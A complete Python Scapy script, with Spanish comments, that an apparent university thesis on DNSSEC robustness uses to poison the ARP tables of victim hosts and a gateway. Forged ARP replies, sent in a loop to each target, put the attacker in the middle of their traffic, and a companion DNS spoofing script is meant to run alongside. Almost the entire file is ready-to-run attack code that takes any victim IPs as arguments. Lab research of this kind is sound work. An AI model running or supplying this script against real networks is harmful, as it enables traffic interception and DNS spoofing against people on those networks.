#!/usr/bin/env python3
# ============================================================
#  arp_poison.py — Envenenamiento de Tablas ARP
#  Técnica: ARP Spoofing / Man-in-the-Middle capa 2
#  Tesis: Evaluación de la robustez de DNSSEC y DNS tradicional
#         frente a técnicas de envenenamiento de caché
#  UTN — Brian Steve Rea Arias
#
#  Descripción:
#    Envenena las tablas ARP de los clientes víctima y del
#    gateway (recursivo) para posicionarse como MITM en capa 2.
#    Debe ejecutarse junto con dns_spoof.py para E5.
#
#  Uso:
#    python3 arp_poison.py
#    python3 arp_poison.py --victimas 192.168.10.10,192.168.10.30
#    python3 arp_poison.py --iface eth0 --intervalo 1.5
# ============================================================

from scapy.all import *
import time, threading, argparse, signal, sys
from datetime import datetime

# ---- Configuración por defecto ----
IFACE           = "eth0"
IP_ATACANTE     = "192.168.10.66"
IP_GATEWAY      = "192.168.20.10"   # DNS recursivo (gateway de los clientes)
VICTIMAS        = [
    "192.168.10.10",   # CLIENTE-1-1
    "192.168.10.30",   # CLIENTE-1-2
    "192.168.10.20",   # Lubuntu
]
INTERVALO       = 1.5   # segundos entre paquetes ARP
activo          = True

# ---- Obtener MAC de una IP ----
def get_mac(ip):
    """Envía ARP request y retorna la MAC. Reintenta 3 veces."""
    for _ in range(3):
        resp = srp1(
            Ether(dst="ff:ff:ff:ff:ff:ff") /
            ARP(pdst=ip),
            timeout=2, verbose=0, iface=IFACE
        )
        if resp:
            return resp.hwsrc
        time.sleep(0.5)
    return None

# ---- Restaurar tablas ARP al salir ----
def restaurar_arp(ip_victima, mac_victima, ip_gateway, mac_gateway):
    """Envía ARP replies correctos para restaurar el estado real."""
    print(f"  Restaurando ARP para {ip_victima}...")
    pkt1 = Ether(dst=mac_victima) / ARP(
        op=2,
        psrc=ip_gateway,  hwsrc=mac_gateway,
        pdst=ip_victima,  hwdst=mac_victima
    )
    pkt2 = Ether(dst=mac_gateway) / ARP(
        op=2,
        psrc=ip_victima,  hwsrc=mac_victima,
        pdst=ip_gateway,  hwdst=mac_gateway
    )
    sendp([pkt1, pkt2], count=5, verbose=0, iface=IFACE)

# ---- Hilo de envenenamiento por víctima ----
def envenenar_victima(ip_victima, mac_victima, mac_gateway):
    """
    Envía ARP replies falsos continuamente a la víctima y al gateway.
    A la víctima le dice: 'yo soy el gateway'.
    Al gateway le dice: 'yo soy la víctima'.
    """
    global activo
    print(f"  [+] Envenenando {ip_victima} (MAC real: {mac_victima})")

    while activo:
        # Decirle a la víctima que la MAC del gateway es la del atacante
        pkt_victima = Ether(dst=mac_victima) / ARP(
            op=2,
            psrc=IP_GATEWAY,  hwsrc=get_if_hwaddr(IFACE),
            pdst=ip_victima,  hwdst=mac_victima
        )
        # Decirle al gateway que la MAC de la víctima es la del atacante
        pkt_gateway = Ether(dst=mac_gateway) / ARP(
            op=2,
            psrc=ip_victima,  hwsrc=get_if_hwaddr(IFACE),
            pdst=IP_GATEWAY,  hwdst=mac_gateway
        )
        sendp([pkt_victima, pkt_gateway], verbose=0, iface=IFACE)
        time.sleep(INTERVALO)

# ---- Señal de interrupción ----
def handler_salida(sig, frame):
    global activo
    print("\n\n  Deteniendo ataque ARP — restaurando tablas...")
    activo = False
    time.sleep(2)
    for ip, mac_v, mac_gw in targets:
        restaurar_arp(ip, mac_v, IP_GATEWAY, mac_gw)
    print("  Tablas ARP restauradas. Saliendo.")
    sys.exit(0)

# ---- Main ----
targets = []

def main():
    global targets, VICTIMAS, IP_GATEWAY, IFACE, INTERVALO

    parser = argparse.ArgumentParser(description="ARP Poisoning MITM — Tesis UTN E5")
    parser.add_argument("--victimas",   default=",".join(VICTIMAS),
                        help="IPs víctima separadas por coma")
    parser.add_argument("--gateway",    default=IP_GATEWAY,
                        help="IP del gateway/recursivo")
    parser.add_argument("--iface",      default=IFACE)
    parser.add_argument("--intervalo",  type=float, default=INTERVALO)
    args = parser.parse_args()

    VICTIMAS   = args.victimas.split(",")
    IP_GATEWAY = args.gateway
    IFACE      = args.iface
    INTERVALO  = args.intervalo

    print("=" * 60)
    print("  ARP POISONING — Man-in-the-Middle capa 2")
    print(f"  Atacante   : {IP_ATACANTE} ({get_if_hwaddr(IFACE)})")
    print(f"  Gateway    : {IP_GATEWAY}")
    print(f"  Víctimas   : {', '.join(VICTIMAS)}")
    print(f"  Intervalo  : {INTERVALO}s")
    print("  Ctrl+C para detener y restaurar ARP")
    print("=" * 60)

    # Registrar handler para Ctrl+C
    signal.signal(signal.SIGINT, handler_salida)

    # Obtener MACs reales antes de envenenar
    print("\n  Resolviendo MACs reales...")
    mac_gateway = get_mac(IP_GATEWAY)
    if not mac_gateway:
        print(f"  [ERROR] No se pudo obtener MAC de {IP_GATEWAY}")
        sys.exit(1)
    print(f"  Gateway {IP_GATEWAY} → MAC {mac_gateway}")

    hilos = []
    for ip in VICTIMAS:
        mac_v = get_mac(ip)
        if not mac_v:
            print(f"  [WARN] No se pudo obtener MAC de {ip}, omitiendo")
            continue
        print(f"  Víctima {ip} → MAC {mac_v}")
        targets.append((ip, mac_v, mac_gateway))

    if not targets:
        print("  [ERROR] Sin víctimas alcanzables. Verificar que los nodos están activos.")
        sys.exit(1)

    print(f"\n  Iniciando envenenamiento ARP — {datetime.now().strftime('%H:%M:%S')}")
    print("  (Ejecutar dns_spoof.py en otra terminal para completar E5)\n")

    for ip, mac_v, mac_gw in targets:
        t = threading.Thread(
            target=envenenar_victima,
            args=(ip, mac_v, mac_gw),
            daemon=True
        )
        t.start()
        hilos.append(t)

    # Mantener vivo el proceso
    while activo:
        time.sleep(1)

if __name__ == "__main__":
    main()
